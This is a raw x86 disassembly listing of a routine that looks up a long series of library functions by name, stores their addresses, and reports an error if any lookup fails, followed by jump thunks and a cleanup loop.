  402b65:	cc                   	int3
  402b66:	cc                   	int3
  402b67:	cc                   	int3
  402b68:	cc                   	int3
  402b69:	cc                   	int3
  402b6a:	cc                   	int3
  402b6b:	cc                   	int3
  402b6c:	cc                   	int3
  402b6d:	cc                   	int3
  402b6e:	cc                   	int3
  402b6f:	cc                   	int3
  402b70:	56                   	push   %esi
  402b71:	8b 74 24 08          	mov    0x8(%esp),%esi
  402b75:	57                   	push   %edi
  402b76:	8b 3d 14 00 42 00    	mov    0x420014,%edi
  402b7c:	68 6c 06 42 00       	push   $0x42066c
  402b81:	56                   	push   %esi
  402b82:	ff d7                	call   *%edi
  402b84:	a3 70 c9 42 00       	mov    %eax,0x42c970
  402b89:	85 c0                	test   %eax,%eax
  402b8b:	75 18                	jne    0x402ba5
  402b8d:	68 88 06 42 00       	push   $0x420688
  402b92:	68 bc 06 42 00       	push   $0x4206bc
  402b97:	e8 64 ed ff ff       	call   0x401900
  402b9c:	83 c4 08             	add    $0x8,%esp
  402b9f:	83 c8 ff             	or     $0xffffffff,%eax
  402ba2:	5f                   	pop    %edi
  402ba3:	5e                   	pop    %esi
  402ba4:	c3                   	ret
  402ba5:	68 cc 06 42 00       	push   $0x4206cc
  402baa:	56                   	push   %esi
  402bab:	ff d7                	call   *%edi
  402bad:	a3 64 c9 42 00       	mov    %eax,0x42c964
  402bb2:	85 c0                	test   %eax,%eax
  402bb4:	75 18                	jne    0x402bce
  402bb6:	68 ec 06 42 00       	push   $0x4206ec
  402bbb:	68 bc 06 42 00       	push   $0x4206bc
  402bc0:	e8 3b ed ff ff       	call   0x401900
  402bc5:	83 c4 08             	add    $0x8,%esp
  402bc8:	83 c8 ff             	or     $0xffffffff,%eax
  402bcb:	5f                   	pop    %edi
  402bcc:	5e                   	pop    %esi
  402bcd:	c3                   	ret
  402bce:	68 24 07 42 00       	push   $0x420724
  402bd3:	56                   	push   %esi
  402bd4:	ff d7                	call   *%edi
  402bd6:	a3 58 c9 42 00       	mov    %eax,0x42c958
  402bdb:	85 c0                	test   %eax,%eax
  402bdd:	75 18                	jne    0x402bf7
  402bdf:	68 34 07 42 00       	push   $0x420734
  402be4:	68 bc 06 42 00       	push   $0x4206bc
  402be9:	e8 12 ed ff ff       	call   0x401900
  402bee:	83 c4 08             	add    $0x8,%esp
  402bf1:	83 c8 ff             	or     $0xffffffff,%eax
  402bf4:	5f                   	pop    %edi
  402bf5:	5e                   	pop    %esi
  402bf6:	c3                   	ret
  402bf7:	68 60 07 42 00       	push   $0x420760
  402bfc:	56                   	push   %esi
  402bfd:	ff d7                	call   *%edi
  402bff:	a3 6c c9 42 00       	mov    %eax,0x42c96c
  402c04:	85 c0                	test   %eax,%eax
  402c06:	75 18                	jne    0x402c20
  402c08:	68 7c 07 42 00       	push   $0x42077c
  402c0d:	68 bc 06 42 00       	push   $0x4206bc
  402c12:	e8 e9 ec ff ff       	call   0x401900
  402c17:	83 c4 08             	add    $0x8,%esp
  402c1a:	83 c8 ff             	or     $0xffffffff,%eax
  402c1d:	5f                   	pop    %edi
  402c1e:	5e                   	pop    %esi
  402c1f:	c3                   	ret
  402c20:	68 b0 07 42 00       	push   $0x4207b0
  402c25:	56                   	push   %esi
  402c26:	ff d7                	call   *%edi
  402c28:	a3 5c c9 42 00       	mov    %eax,0x42c95c
  402c2d:	85 c0                	test   %eax,%eax
  402c2f:	75 18                	jne    0x402c49
  402c31:	68 c0 07 42 00       	push   $0x4207c0
  402c36:	68 bc 06 42 00       	push   $0x4206bc
  402c3b:	e8 c0 ec ff ff       	call   0x401900
  402c40:	83 c4 08             	add    $0x8,%esp
  402c43:	83 c8 ff             	or     $0xffffffff,%eax
  402c46:	5f                   	pop    %edi
  402c47:	5e                   	pop    %esi
  402c48:	c3                   	ret
  402c49:	68 ec 07 42 00       	push   $0x4207ec
  402c4e:	56                   	push   %esi
  402c4f:	ff d7                	call   *%edi
  402c51:	a3 74 c9 42 00       	mov    %eax,0x42c974
  402c56:	85 c0                	test   %eax,%eax
  402c58:	75 18                	jne    0x402c72
  402c5a:	68 04 08 42 00       	push   $0x420804
  402c5f:	68 bc 06 42 00       	push   $0x4206bc
  402c64:	e8 97 ec ff ff       	call   0x401900
  402c69:	83 c4 08             	add    $0x8,%esp
  402c6c:	83 c8 ff             	or     $0xffffffff,%eax
  402c6f:	5f                   	pop    %edi
  402c70:	5e                   	pop    %esi
  402c71:	c3                   	ret
  402c72:	68 38 08 42 00       	push   $0x420838
  402c77:	56                   	push   %esi
  402c78:	ff d7                	call   *%edi
  402c7a:	a3 60 c9 42 00       	mov    %eax,0x42c960
  402c7f:	85 c0                	test   %eax,%eax
  402c81:	75 18                	jne    0x402c9b
  402c83:	68 48 08 42 00       	push   $0x420848
  402c88:	68 bc 06 42 00       	push   $0x4206bc
  402c8d:	e8 6e ec ff ff       	call   0x401900
  402c92:	83 c4 08             	add    $0x8,%esp
  402c95:	83 c8 ff             	or     $0xffffffff,%eax
  402c98:	5f                   	pop    %edi
  402c99:	5e                   	pop    %esi
  402c9a:	c3                   	ret
  402c9b:	68 74 08 42 00       	push   $0x420874
  402ca0:	56                   	push   %esi
  402ca1:	ff d7                	call   *%edi
  402ca3:	a3 68 c9 42 00       	mov    %eax,0x42c968
  402ca8:	85 c0                	test   %eax,%eax
  402caa:	75 18                	jne    0x402cc4
  402cac:	68 84 08 42 00       	push   $0x420884
  402cb1:	68 bc 06 42 00       	push   $0x4206bc
  402cb6:	e8 45 ec ff ff       	call   0x401900
  402cbb:	83 c4 08             	add    $0x8,%esp
  402cbe:	83 c8 ff             	or     $0xffffffff,%eax
  402cc1:	5f                   	pop    %edi
  402cc2:	5e                   	pop    %esi
  402cc3:	c3                   	ret
  402cc4:	68 b0 08 42 00       	push   $0x4208b0
  402cc9:	56                   	push   %esi
  402cca:	ff d7                	call   *%edi
  402ccc:	a3 bc c9 42 00       	mov    %eax,0x42c9bc
  402cd1:	85 c0                	test   %eax,%eax
  402cd3:	75 18                	jne    0x402ced
  402cd5:	68 c0 08 42 00       	push   $0x4208c0
  402cda:	68 bc 06 42 00       	push   $0x4206bc
  402cdf:	e8 1c ec ff ff       	call   0x401900
  402ce4:	83 c4 08             	add    $0x8,%esp
  402ce7:	83 c8 ff             	or     $0xffffffff,%eax
  402cea:	5f                   	pop    %edi
  402ceb:	5e                   	pop    %esi
  402cec:	c3                   	ret
  402ced:	68 ec 08 42 00       	push   $0x4208ec
  402cf2:	56                   	push   %esi
  402cf3:	ff d7                	call   *%edi
  402cf5:	a3 84 c9 42 00       	mov    %eax,0x42c984
  402cfa:	85 c0                	test   %eax,%eax
  402cfc:	75 18                	jne    0x402d16
  402cfe:	68 f8 08 42 00       	push   $0x4208f8
  402d03:	68 bc 06 42 00       	push   $0x4206bc
  402d08:	e8 f3 eb ff ff       	call   0x401900
  402d0d:	83 c4 08             	add    $0x8,%esp
  402d10:	83 c8 ff             	or     $0xffffffff,%eax
  402d13:	5f                   	pop    %edi
  402d14:	5e                   	pop    %esi
  402d15:	c3                   	ret
  402d16:	68 20 09 42 00       	push   $0x420920
  402d1b:	56                   	push   %esi
  402d1c:	ff d7                	call   *%edi
  402d1e:	a3 7c c9 42 00       	mov    %eax,0x42c97c
  402d23:	85 c0                	test   %eax,%eax
  402d25:	75 18                	jne    0x402d3f
  402d27:	68 2c 09 42 00       	push   $0x42092c
  402d2c:	68 bc 06 42 00       	push   $0x4206bc
  402d31:	e8 ca eb ff ff       	call   0x401900
  402d36:	83 c4 08             	add    $0x8,%esp
  402d39:	83 c8 ff             	or     $0xffffffff,%eax
  402d3c:	5f                   	pop    %edi
  402d3d:	5e                   	pop    %esi
  402d3e:	c3                   	ret
  402d3f:	68 54 09 42 00       	push   $0x420954
  402d44:	56                   	push   %esi
  402d45:	ff d7                	call   *%edi
  402d47:	a3 80 c9 42 00       	mov    %eax,0x42c980
  402d4c:	85 c0                	test   %eax,%eax
  402d4e:	75 18                	jne    0x402d68
  402d50:	68 60 09 42 00       	push   $0x420960
  402d55:	68 bc 06 42 00       	push   $0x4206bc
  402d5a:	e8 a1 eb ff ff       	call   0x401900
  402d5f:	83 c4 08             	add    $0x8,%esp
  402d62:	83 c8 ff             	or     $0xffffffff,%eax
  402d65:	5f                   	pop    %edi
  402d66:	5e                   	pop    %esi
  402d67:	c3                   	ret
  402d68:	68 88 09 42 00       	push   $0x420988
  402d6d:	56                   	push   %esi
  402d6e:	ff d7                	call   *%edi
  402d70:	a3 78 c9 42 00       	mov    %eax,0x42c978
  402d75:	85 c0                	test   %eax,%eax
  402d77:	75 18                	jne    0x402d91
  402d79:	68 98 09 42 00       	push   $0x420998
  402d7e:	68 bc 06 42 00       	push   $0x4206bc
  402d83:	e8 78 eb ff ff       	call   0x401900
  402d88:	83 c4 08             	add    $0x8,%esp
  402d8b:	83 c8 ff             	or     $0xffffffff,%eax
  402d8e:	5f                   	pop    %edi
  402d8f:	5e                   	pop    %esi
  402d90:	c3                   	ret
  402d91:	53                   	push   %ebx
  402d92:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402d96:	83 fb 1e             	cmp    $0x1e,%ebx
  402d99:	7c 36                	jl     0x402dd1
  402d9b:	68 c4 09 42 00       	push   $0x4209c4
  402da0:	56                   	push   %esi
  402da1:	ff d7                	call   *%edi
  402da3:	a3 90 c9 42 00       	mov    %eax,0x42c990
  402da8:	85 c0                	test   %eax,%eax
  402daa:	75 0a                	jne    0x402db6
  402dac:	68 d0 09 42 00       	push   $0x4209d0
  402db1:	e9 67 03 00 00       	jmp    0x40311d
  402db6:	68 f8 09 42 00       	push   $0x4209f8
  402dbb:	56                   	push   %esi
  402dbc:	ff d7                	call   *%edi
  402dbe:	a3 94 c9 42 00       	mov    %eax,0x42c994
  402dc3:	85 c0                	test   %eax,%eax
  402dc5:	75 0a                	jne    0x402dd1
  402dc7:	68 04 0a 42 00       	push   $0x420a04
  402dcc:	e9 4c 03 00 00       	jmp    0x40311d
  402dd1:	68 2c 0a 42 00       	push   $0x420a2c
  402dd6:	56                   	push   %esi
  402dd7:	ff d7                	call   *%edi
  402dd9:	a3 88 c9 42 00       	mov    %eax,0x42c988
  402dde:	85 c0                	test   %eax,%eax
  402de0:	75 0a                	jne    0x402dec
  402de2:	68 40 0a 42 00       	push   $0x420a40
  402de7:	e9 31 03 00 00       	jmp    0x40311d
  402dec:	68 70 0a 42 00       	push   $0x420a70
  402df1:	56                   	push   %esi
  402df2:	ff d7                	call   *%edi
  402df4:	a3 8c c9 42 00       	mov    %eax,0x42c98c
  402df9:	85 c0                	test   %eax,%eax
  402dfb:	75 0a                	jne    0x402e07
  402dfd:	68 84 0a 42 00       	push   $0x420a84
  402e02:	e9 16 03 00 00       	jmp    0x40311d
  402e07:	68 b0 0a 42 00       	push   $0x420ab0
  402e0c:	56                   	push   %esi
  402e0d:	ff d7                	call   *%edi
  402e0f:	a3 d0 c9 42 00       	mov    %eax,0x42c9d0
  402e14:	85 c0                	test   %eax,%eax
  402e16:	75 0a                	jne    0x402e22
  402e18:	68 c8 0a 42 00       	push   $0x420ac8
  402e1d:	e9 fb 02 00 00       	jmp    0x40311d
  402e22:	68 f8 0a 42 00       	push   $0x420af8
  402e27:	56                   	push   %esi
  402e28:	ff d7                	call   *%edi
  402e2a:	a3 d4 c9 42 00       	mov    %eax,0x42c9d4
  402e2f:	85 c0                	test   %eax,%eax
  402e31:	75 0a                	jne    0x402e3d
  402e33:	68 04 0b 42 00       	push   $0x420b04
  402e38:	e9 e0 02 00 00       	jmp    0x40311d
  402e3d:	68 2c 0b 42 00       	push   $0x420b2c
  402e42:	56                   	push   %esi
  402e43:	ff d7                	call   *%edi
  402e45:	a3 d8 c9 42 00       	mov    %eax,0x42c9d8
  402e4a:	85 c0                	test   %eax,%eax
  402e4c:	75 0a                	jne    0x402e58
  402e4e:	68 3c 0b 42 00       	push   $0x420b3c
  402e53:	e9 c5 02 00 00       	jmp    0x40311d
  402e58:	68 68 0b 42 00       	push   $0x420b68
  402e5d:	56                   	push   %esi
  402e5e:	ff d7                	call   *%edi
  402e60:	a3 dc c9 42 00       	mov    %eax,0x42c9dc
  402e65:	85 c0                	test   %eax,%eax
  402e67:	75 0a                	jne    0x402e73
  402e69:	68 74 0b 42 00       	push   $0x420b74
  402e6e:	e9 aa 02 00 00       	jmp    0x40311d
  402e73:	68 9c 0b 42 00       	push   $0x420b9c
  402e78:	56                   	push   %esi
  402e79:	ff d7                	call   *%edi
  402e7b:	a3 ac c9 42 00       	mov    %eax,0x42c9ac
  402e80:	85 c0                	test   %eax,%eax
  402e82:	75 0a                	jne    0x402e8e
  402e84:	68 b0 0b 42 00       	push   $0x420bb0
  402e89:	e9 8f 02 00 00       	jmp    0x40311d
  402e8e:	68 e0 0b 42 00       	push   $0x420be0
  402e93:	56                   	push   %esi
  402e94:	ff d7                	call   *%edi
  402e96:	a3 a4 c9 42 00       	mov    %eax,0x42c9a4
  402e9b:	85 c0                	test   %eax,%eax
  402e9d:	75 0a                	jne    0x402ea9
  402e9f:	68 f8 0b 42 00       	push   $0x420bf8
  402ea4:	e9 74 02 00 00       	jmp    0x40311d
  402ea9:	68 2c 0c 42 00       	push   $0x420c2c
  402eae:	56                   	push   %esi
  402eaf:	ff d7                	call   *%edi
  402eb1:	a3 a8 c9 42 00       	mov    %eax,0x42c9a8
  402eb6:	85 c0                	test   %eax,%eax
  402eb8:	75 0a                	jne    0x402ec4
  402eba:	68 44 0c 42 00       	push   $0x420c44
  402ebf:	e9 59 02 00 00       	jmp    0x40311d
  402ec4:	68 78 0c 42 00       	push   $0x420c78
  402ec9:	56                   	push   %esi
  402eca:	ff d7                	call   *%edi
  402ecc:	a3 b8 c9 42 00       	mov    %eax,0x42c9b8
  402ed1:	85 c0                	test   %eax,%eax
  402ed3:	75 0a                	jne    0x402edf
  402ed5:	68 88 0c 42 00       	push   $0x420c88
  402eda:	e9 3e 02 00 00       	jmp    0x40311d
  402edf:	68 b4 0c 42 00       	push   $0x420cb4
  402ee4:	56                   	push   %esi
  402ee5:	ff d7                	call   *%edi
  402ee7:	a3 b4 c9 42 00       	mov    %eax,0x42c9b4
  402eec:	85 c0                	test   %eax,%eax
  402eee:	75 0a                	jne    0x402efa
  402ef0:	68 c0 0c 42 00       	push   $0x420cc0
  402ef5:	e9 23 02 00 00       	jmp    0x40311d
  402efa:	68 e8 0c 42 00       	push   $0x420ce8
  402eff:	56                   	push   %esi
  402f00:	ff d7                	call   *%edi
  402f02:	a3 e4 c9 42 00       	mov    %eax,0x42c9e4
  402f07:	85 c0                	test   %eax,%eax
  402f09:	75 0a                	jne    0x402f15
  402f0b:	68 f8 0c 42 00       	push   $0x420cf8
  402f10:	e9 08 02 00 00       	jmp    0x40311d
  402f15:	68 24 0d 42 00       	push   $0x420d24
  402f1a:	56                   	push   %esi
  402f1b:	ff d7                	call   *%edi
  402f1d:	a3 cc c9 42 00       	mov    %eax,0x42c9cc
  402f22:	85 c0                	test   %eax,%eax
  402f24:	75 0a                	jne    0x402f30
  402f26:	68 38 0d 42 00       	push   $0x420d38
  402f2b:	e9 ed 01 00 00       	jmp    0x40311d
  402f30:	68 64 0d 42 00       	push   $0x420d64
  402f35:	56                   	push   %esi
  402f36:	ff d7                	call   *%edi
  402f38:	a3 c8 c9 42 00       	mov    %eax,0x42c9c8
  402f3d:	85 c0                	test   %eax,%eax
  402f3f:	75 0a                	jne    0x402f4b
  402f41:	68 7c 0d 42 00       	push   $0x420d7c
  402f46:	e9 d2 01 00 00       	jmp    0x40311d
  402f4b:	68 b0 0d 42 00       	push   $0x420db0
  402f50:	56                   	push   %esi
  402f51:	ff d7                	call   *%edi
  402f53:	a3 b0 c9 42 00       	mov    %eax,0x42c9b0
  402f58:	85 c0                	test   %eax,%eax
  402f5a:	75 0a                	jne    0x402f66
  402f5c:	68 c8 0d 42 00       	push   $0x420dc8
  402f61:	e9 b7 01 00 00       	jmp    0x40311d
  402f66:	68 fc 0d 42 00       	push   $0x420dfc
  402f6b:	56                   	push   %esi
  402f6c:	ff d7                	call   *%edi
  402f6e:	a3 a0 c9 42 00       	mov    %eax,0x42c9a0
  402f73:	85 c0                	test   %eax,%eax
  402f75:	75 0a                	jne    0x402f81
  402f77:	68 10 0e 42 00       	push   $0x420e10
  402f7c:	e9 9c 01 00 00       	jmp    0x40311d
  402f81:	83 fb 1e             	cmp    $0x1e,%ebx
  402f84:	7d 36                	jge    0x402fbc
  402f86:	68 40 0e 42 00       	push   $0x420e40
  402f8b:	56                   	push   %esi
  402f8c:	ff d7                	call   *%edi
  402f8e:	a3 c0 c9 42 00       	mov    %eax,0x42c9c0
  402f93:	85 c0                	test   %eax,%eax
  402f95:	75 0a                	jne    0x402fa1
  402f97:	68 54 0e 42 00       	push   $0x420e54
  402f9c:	e9 7c 01 00 00       	jmp    0x40311d
  402fa1:	68 84 0e 42 00       	push   $0x420e84
  402fa6:	56                   	push   %esi
  402fa7:	ff d7                	call   *%edi
  402fa9:	a3 f4 c9 42 00       	mov    %eax,0x42c9f4
  402fae:	85 c0                	test   %eax,%eax
  402fb0:	75 0a                	jne    0x402fbc
  402fb2:	68 98 0e 42 00       	push   $0x420e98
  402fb7:	e9 61 01 00 00       	jmp    0x40311d
  402fbc:	68 c8 0e 42 00       	push   $0x420ec8
  402fc1:	56                   	push   %esi
  402fc2:	ff d7                	call   *%edi
  402fc4:	a3 e0 c9 42 00       	mov    %eax,0x42c9e0
  402fc9:	85 c0                	test   %eax,%eax
  402fcb:	75 0a                	jne    0x402fd7
  402fcd:	68 dc 0e 42 00       	push   $0x420edc
  402fd2:	e9 46 01 00 00       	jmp    0x40311d
  402fd7:	68 0c 0f 42 00       	push   $0x420f0c
  402fdc:	56                   	push   %esi
  402fdd:	ff d7                	call   *%edi
  402fdf:	a3 9c c9 42 00       	mov    %eax,0x42c99c
  402fe4:	85 c0                	test   %eax,%eax
  402fe6:	75 0a                	jne    0x402ff2
  402fe8:	68 1c 0f 42 00       	push   $0x420f1c
  402fed:	e9 2b 01 00 00       	jmp    0x40311d
  402ff2:	68 48 0f 42 00       	push   $0x420f48
  402ff7:	56                   	push   %esi
  402ff8:	ff d7                	call   *%edi
  402ffa:	a3 f0 c9 42 00       	mov    %eax,0x42c9f0
  402fff:	85 c0                	test   %eax,%eax
  403001:	75 0a                	jne    0x40300d
  403003:	68 58 0f 42 00       	push   $0x420f58
  403008:	e9 10 01 00 00       	jmp    0x40311d
  40300d:	68 84 0f 42 00       	push   $0x420f84
  403012:	56                   	push   %esi
  403013:	ff d7                	call   *%edi
  403015:	a3 e8 c9 42 00       	mov    %eax,0x42c9e8
  40301a:	85 c0                	test   %eax,%eax
  40301c:	75 0a                	jne    0x403028
  40301e:	68 94 0f 42 00       	push   $0x420f94
  403023:	e9 f5 00 00 00       	jmp    0x40311d
  403028:	68 c0 0f 42 00       	push   $0x420fc0
  40302d:	56                   	push   %esi
  40302e:	ff d7                	call   *%edi
  403030:	a3 98 c9 42 00       	mov    %eax,0x42c998
  403035:	85 c0                	test   %eax,%eax
  403037:	75 0a                	jne    0x403043
  403039:	68 d0 0f 42 00       	push   $0x420fd0
  40303e:	e9 da 00 00 00       	jmp    0x40311d
  403043:	68 fc 0f 42 00       	push   $0x420ffc
  403048:	56                   	push   %esi
  403049:	ff d7                	call   *%edi
  40304b:	a3 04 ca 42 00       	mov    %eax,0x42ca04
  403050:	85 c0                	test   %eax,%eax
  403052:	75 0a                	jne    0x40305e
  403054:	68 0c 10 42 00       	push   $0x42100c
  403059:	e9 bf 00 00 00       	jmp    0x40311d
  40305e:	68 38 10 42 00       	push   $0x421038
  403063:	56                   	push   %esi
  403064:	ff d7                	call   *%edi
  403066:	a3 08 ca 42 00       	mov    %eax,0x42ca08
  40306b:	85 c0                	test   %eax,%eax
  40306d:	75 0a                	jne    0x403079
  40306f:	68 58 10 42 00       	push   $0x421058
  403074:	e9 a4 00 00 00       	jmp    0x40311d
  403079:	83 fb 1e             	cmp    $0x1e,%ebx
  40307c:	0f 8c 80 00 00 00    	jl     0x403102
  403082:	68 94 10 42 00       	push   $0x421094
  403087:	56                   	push   %esi
  403088:	ff d7                	call   *%edi
  40308a:	a3 c4 c9 42 00       	mov    %eax,0x42c9c4
  40308f:	85 c0                	test   %eax,%eax
  403091:	75 0a                	jne    0x40309d
  403093:	68 ac 10 42 00       	push   $0x4210ac
  403098:	e9 80 00 00 00       	jmp    0x40311d
  40309d:	83 fb 23             	cmp    $0x23,%ebx
  4030a0:	7c 18                	jl     0x4030ba
  4030a2:	68 dc 10 42 00       	push   $0x4210dc
  4030a7:	56                   	push   %esi
  4030a8:	ff d7                	call   *%edi
  4030aa:	a3 ec c9 42 00       	mov    %eax,0x42c9ec
  4030af:	85 c0                	test   %eax,%eax
  4030b1:	75 1f                	jne    0x4030d2
  4030b3:	68 ec 10 42 00       	push   $0x4210ec
  4030b8:	eb 63                	jmp    0x40311d
  4030ba:	68 18 11 42 00       	push   $0x421118
  4030bf:	56                   	push   %esi
  4030c0:	ff d7                	call   *%edi
  4030c2:	a3 ec c9 42 00       	mov    %eax,0x42c9ec
  4030c7:	85 c0                	test   %eax,%eax
  4030c9:	75 07                	jne    0x4030d2
  4030cb:	68 28 11 42 00       	push   $0x421128
  4030d0:	eb 4b                	jmp    0x40311d
  4030d2:	68 54 11 42 00       	push   $0x421154
  4030d7:	56                   	push   %esi
  4030d8:	ff d7                	call   *%edi
  4030da:	a3 f8 c9 42 00       	mov    %eax,0x42c9f8
  4030df:	85 c0                	test   %eax,%eax
  4030e1:	75 07                	jne    0x4030ea
  4030e3:	68 6c 11 42 00       	push   $0x42116c
  4030e8:	eb 33                	jmp    0x40311d
  4030ea:	68 9c 11 42 00       	push   $0x42119c
  4030ef:	56                   	push   %esi
  4030f0:	ff d7                	call   *%edi
  4030f2:	a3 00 ca 42 00       	mov    %eax,0x42ca00
  4030f7:	85 c0                	test   %eax,%eax
  4030f9:	75 07                	jne    0x403102
  4030fb:	68 b0 11 42 00       	push   $0x4211b0
  403100:	eb 1b                	jmp    0x40311d
  403102:	83 fb 20             	cmp    $0x20,%ebx
  403105:	7c 2a                	jl     0x403131
  403107:	68 dc 11 42 00       	push   $0x4211dc
  40310c:	56                   	push   %esi
  40310d:	ff d7                	call   *%edi
  40310f:	a3 fc c9 42 00       	mov    %eax,0x42c9fc
  403114:	85 c0                	test   %eax,%eax
  403116:	75 19                	jne    0x403131
  403118:	68 f8 11 42 00       	push   $0x4211f8
  40311d:	68 bc 06 42 00       	push   $0x4206bc
  403122:	e8 d9 e7 ff ff       	call   0x401900
  403127:	83 c4 08             	add    $0x8,%esp
  40312a:	83 c8 ff             	or     $0xffffffff,%eax
  40312d:	5b                   	pop    %ebx
  40312e:	5f                   	pop    %edi
  40312f:	5e                   	pop    %esi
  403130:	c3                   	ret
  403131:	5b                   	pop    %ebx
  403132:	5f                   	pop    %edi
  403133:	33 c0                	xor    %eax,%eax
  403135:	5e                   	pop    %esi
  403136:	c3                   	ret
  403137:	cc                   	int3
  403138:	cc                   	int3
  403139:	cc                   	int3
  40313a:	cc                   	int3
  40313b:	cc                   	int3
  40313c:	cc                   	int3
  40313d:	cc                   	int3
  40313e:	cc                   	int3
  40313f:	cc                   	int3
  403140:	ff 25 e0 c9 42 00    	jmp    *0x42c9e0
  403146:	cc                   	int3
  403147:	cc                   	int3
  403148:	cc                   	int3
  403149:	cc                   	int3
  40314a:	cc                   	int3
  40314b:	cc                   	int3
  40314c:	cc                   	int3
  40314d:	cc                   	int3
  40314e:	cc                   	int3
  40314f:	cc                   	int3
  403150:	ff 25 9c c9 42 00    	jmp    *0x42c99c
  403156:	cc                   	int3
  403157:	cc                   	int3
  403158:	cc                   	int3
  403159:	cc                   	int3
  40315a:	cc                   	int3
  40315b:	cc                   	int3
  40315c:	cc                   	int3
  40315d:	cc                   	int3
  40315e:	cc                   	int3
  40315f:	cc                   	int3
  403160:	ff 25 98 c9 42 00    	jmp    *0x42c998
  403166:	cc                   	int3
  403167:	cc                   	int3
  403168:	cc                   	int3
  403169:	cc                   	int3
  40316a:	cc                   	int3
  40316b:	cc                   	int3
  40316c:	cc                   	int3
  40316d:	cc                   	int3
  40316e:	cc                   	int3
  40316f:	cc                   	int3
  403170:	ff 25 88 c9 42 00    	jmp    *0x42c988
  403176:	cc                   	int3
  403177:	cc                   	int3
  403178:	cc                   	int3
  403179:	cc                   	int3
  40317a:	cc                   	int3
  40317b:	cc                   	int3
  40317c:	cc                   	int3
  40317d:	cc                   	int3
  40317e:	cc                   	int3
  40317f:	cc                   	int3
  403180:	ff 25 8c c9 42 00    	jmp    *0x42c98c
  403186:	cc                   	int3
  403187:	cc                   	int3
  403188:	cc                   	int3
  403189:	cc                   	int3
  40318a:	cc                   	int3
  40318b:	cc                   	int3
  40318c:	cc                   	int3
  40318d:	cc                   	int3
  40318e:	cc                   	int3
  40318f:	cc                   	int3
  403190:	56                   	push   %esi
  403191:	57                   	push   %edi
  403192:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403196:	8b f7                	mov    %edi,%esi
  403198:	8b 07                	mov    (%edi),%eax
  40319a:	85 c0                	test   %eax,%eax
  40319c:	74 15                	je     0x4031b3
  40319e:	66 90                	xchg   %ax,%ax
  4031a0:	50                   	push   %eax
  4031a1:	e8 b0 6a 00 00       	call   0x409c56
  4031a6:	8b 46 04             	mov    0x4(%esi),%eax
  4031a9:	8d 76 04             	lea    0x4(%esi),%esi
  4031ac:	83 c4 04             	add    $0x4,%esp
  4031af:	85 c0                	test   %eax,%eax
  4031b1:	75 ed                	jne    0x4031a0
  4031b3:	57                   	push   %edi
  4031b4:	e8 9d 6a 00 00       	call   0x409c56
  4031b9:	83 c4 04             	add    $0x4,%esp
  4031bc:	5f                   	pop    %edi
  4031bd:	5e                   	pop    %esi
  4031be:	c3                   	ret
  4031bf:	cc                   	int3
  4031c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031c4:	83 b8 6c 40 00 00 01 	cmpl   $0x1,0x406c(%eax)
  4031cb:	75 06                	jne    0x4031d3
  4031cd:	ff 25 7c c9 42 00    	jmp    *0x42c97c
  4031d3:	c3                   	ret
  4031d4:	cc                   	int3
  4031d5:	cc                   	int3
  4031d6:	cc                   	int3
  4031d7:	cc                   	int3
  4031d8:	cc                   	int3
  4031d9:	cc                   	int3
  4031da:	cc                   	int3
  4031db:	cc                   	int3
  4031dc:	cc                   	int3
  4031dd:	cc                   	int3
  4031de:	cc                   	int3
  4031df:	cc                   	int3
  4031e0:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4031e7:	53                   	push   %ebx
  4031e8:	56                   	push   %esi
  4031e9:	57                   	push   %edi
  4031ea:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4031ee:	74 41                	je     0x403231
  4031f0:	6a 00                	push   $0x0
  4031f2:	8d 87 68 30 00 00    	lea    0x3068(%edi),%eax
  4031f8:	50                   	push   %eax
  4031f9:	6a 00                	push   $0x0
  4031fb:	e8 10 1b 00 00       	call   0x404d10
  403200:	8b f0                	mov    %eax,%esi
  403202:	83 c4 0c             	add    $0xc,%esp
  403205:	85 f6                	test   %esi,%esi
  403207:	75 14                	jne    0x40321d
  403209:	68 58 14 42 00       	push   $0x421458
  40320e:	e8 fd e7 ff ff       	call   0x401a10
  403213:	83 c4 04             	add    $0x4,%esp
  403216:	83 c8 ff             	or     $0xffffffff,%eax
  403219:	5f                   	pop    %edi
  40321a:	5e                   	pop    %esi
  40321b:	5b                   	pop    %ebx
  40321c:	c3                   	ret
  40321d:	56                   	push   %esi
  40321e:	ff 15 c0 c9 42 00    	call   *0x42c9c0
  403224:	56                   	push   %esi
  403225:	8b d8                	mov    %eax,%ebx
  403227:	e8 2a 6a 00 00       	call   0x409c56
  40322c:	83 c4 08             	add    $0x8,%esp
  40322f:	eb 2f                	jmp    0x403260
  403231:	8d 97 68 30 00 00    	lea    0x3068(%edi),%edx
  403237:	8b ca                	mov    %edx,%ecx
  403239:	8d 71 01             	lea    0x1(%ecx),%esi
  40323c:	0f 1f 40 00          	nopl   0x0(%eax)
  403240:	8a 01                	mov    (%ecx),%al
  403242:	41                   	inc    %ecx
  403243:	84 c0                	test   %al,%al
  403245:	75 f9                	jne    0x403240
  403247:	68 7c 14 42 00       	push   $0x42147c
  40324c:	2b ce                	sub    %esi,%ecx
  40324e:	68 84 14 42 00       	push   $0x421484
  403253:	51                   	push   %ecx
  403254:	52                   	push   %edx
  403255:	ff 15 00 ca 42 00    	call   *0x42ca00
  40325b:	83 c4 10             	add    $0x10,%esp
  40325e:	8b d8                	mov    %eax,%ebx
  403260:	85 db                	test   %ebx,%ebx
  403262:	75 14                	jne    0x403278
  403264:	68 8c 14 42 00       	push   $0x42148c
  403269:	e8 a2 e7 ff ff       	call   0x401a10
  40326e:	83 c4 04             	add    $0x4,%esp
  403271:	83 c8 ff             	or     $0xffffffff,%eax
  403274:	5f                   	pop    %edi
  403275:	5e                   	pop    %esi
  403276:	5b                   	pop    %ebx
  403277:	c3                   	ret
  403278:	55                   	push   %ebp
  403279:	53                   	push   %ebx
  40327a:	68 b4 14 42 00       	push   $0x4214b4
  40327f:	ff 15 e8 c9 42 00    	call   *0x42c9e8
  403285:	68 c0 14 42 00       	push   $0x4214c0
  40328a:	ff 15 a8 c9 42 00    	call   *0x42c9a8
  403290:	50                   	push   %eax
  403291:	ff 15 cc c9 42 00    	call   *0x42c9cc
  403297:	68 c8 14 42 00       	push   $0x4214c8
  40329c:	50                   	push   %eax
  40329d:	ff 15 d0 c9 42 00    	call   *0x42c9d0
  4032a3:	8b 77 08             	mov    0x8(%edi),%esi
  4032a6:	83 c4 18             	add    $0x18,%esp
